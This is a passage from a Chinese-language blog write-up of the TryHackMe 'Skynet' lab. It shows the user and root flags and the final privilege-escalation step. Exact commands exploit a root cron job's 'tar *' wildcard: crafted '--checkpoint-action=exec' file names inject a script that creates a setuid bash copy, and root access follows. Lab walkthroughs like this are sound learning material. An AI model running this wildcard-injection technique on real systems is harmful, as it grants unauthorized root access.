<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> user.txt <br>7ce5c2109a40f958099283600a9ae807<br></code></pre></td></tr></table></figure>

<blockquote>
<p>What is the root flag?</p>
</blockquote>
<p>计划任务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/home/milesdyson/backups$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># m h dom mon dow user  command</span><br>*/1 *   * * *   root    /home/milesdyson/backups/backup.sh<br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><br><span class="hljs-comment"># backup.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /var/www/html<br>tar cf /home/milesdyson/backups/backup.tgz *<br></code></pre></td></tr></table></figure>

<blockquote>
<p>通过**<code>tar</code><strong>命令可以利用一个名为</strong><code>–checkpoint</code>**的参数，该参数允许在每次归档 X 个文件时（X的默认值为10）显示“进度”消息， **<code>–checkpoint</code><strong>还可以与 <strong><code>–checkpoint-action</code></strong> 标志串联使用，</strong><code>–checkpoint-action</code>**标志允许在到达检查点（checkpoint）时以二进制或脚本的形式执行某些操作。</p>
</blockquote>
<p>在<code>/var/www/html</code>目录下创建一个脚本来提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/var/www/html$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/sroot &amp;&amp; chmod +s /tmp/sroot&quot;</span> &gt; shell.sh<br></code></pre></td></tr></table></figure>

<p>再创建两个文件用来利用tar执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/var/www/html$ <span class="hljs-built_in">touch</span> <span class="hljs-string">&quot;/var/www/html/--checkpoint=1&quot;</span><br>www-data@skynet:/var/www/html$ <span class="hljs-built_in">touch</span> <span class="hljs-string">&quot;/var/www/html/--checkpoint-action=exec=sh shell.sh&quot;</span><br>www-data@skynet:/tmp$ ./sroot -p<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br>sroot-4.3<span class="hljs-comment"># cat /root/root.txt</span><br>3f0372db24753accc7179a282cd6a949<br></code></pre></td></tr></table></figure>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/TryHackMe/">#TryHackMe</a>
      
        <a href="/tags/%E9%9D%B6%E6%9C%BA/">#靶机</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>TryHackMe-Skynet</div>
      <div>https://cvbxy.github.io/2023/07/22/TryHackMe-Skynet/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>cvbxy</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年7月22日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/06/20/github-hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/" title="github+hexo博客搭建记录">
                        <span class="hidden-mobile">github+hexo博客搭建记录</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
